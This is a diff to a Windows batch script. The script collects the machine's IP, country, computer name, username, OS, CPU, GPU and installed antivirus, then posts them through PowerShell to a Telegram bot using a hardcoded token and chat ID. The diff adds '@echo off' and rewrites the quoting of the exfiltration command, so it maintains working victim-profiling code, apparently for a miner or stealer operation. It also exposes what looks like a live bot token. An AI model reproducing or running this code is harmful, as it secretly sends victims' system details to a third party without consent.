@@ -1,3 +1,4 @@
+@echo off
 setlocal EnableDelayedExpansion
 
 set "TOKEN=7615353876:AAF-Mcj1DDxs85m-pU4fAIR34jJ1r8y7p54"
@@ -48,7 +49,7 @@ set "UserName=%USERNAME%"
 set "Worker=%COMPUTERNAME%"
 
 powershell -NoProfile -Command ^
-  "$message = 'RUSnIP: %IP%nCountry: %Country%nWorker: %Worker%nUserName: %UserName%nWindows: %Windows% %Arch%nCPU: %CPU%nGPU: %GPU%nAntivirus: %Antivirus%';" ^
-  "[System.Console]::OutputEncoding = [System.Text.Encoding]::UTF8;" ^
-  "try { Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message} } catch { Write-Host 'Error sending message to Telegram' }"
+  "[System.Console]::OutputEncoding = [System.Text.Encoding]::UTF8; " ^
+  "$message = \"RUSnIP: %IP%nCountry: %Country%nWorker: %Worker%nUserName: %UserName%nWindows: %Windows% %Arch%nCPU: %CPU%nGPU: %GPU%nAntivirus: %Antivirus%\"; " ^
+  "try { Invoke-RestMethod -Uri \"https://api.telegram.org/bot%TOKEN%/sendMessage\" -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message} } catch { Write-Host 'Error sending message to Telegram' }"
 endlocal
